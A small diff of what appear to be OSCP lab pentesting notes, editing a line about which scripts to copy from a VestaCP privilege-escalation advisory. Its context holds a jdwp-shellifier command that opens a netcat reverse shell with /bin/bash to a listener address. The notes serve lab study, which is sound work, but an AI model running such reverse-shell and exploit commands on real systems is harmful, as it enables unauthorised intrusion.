@@ -2706,7 +2706,7 @@ id
 python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.161 5000 -e /bin/bash"
 ```
 ### Vesta - Linux Priv Exploit
-- Links [Code](https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/), Copy last 3 code with same name file
+- Links [Code](https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/), Copy last 3 code with same name as shown in the article file (vestaATO.py, VestaFuncs.py, vestaROOT.py)
 - Reference OSCPC 156 Challenge lab Machine
   
 ```bash
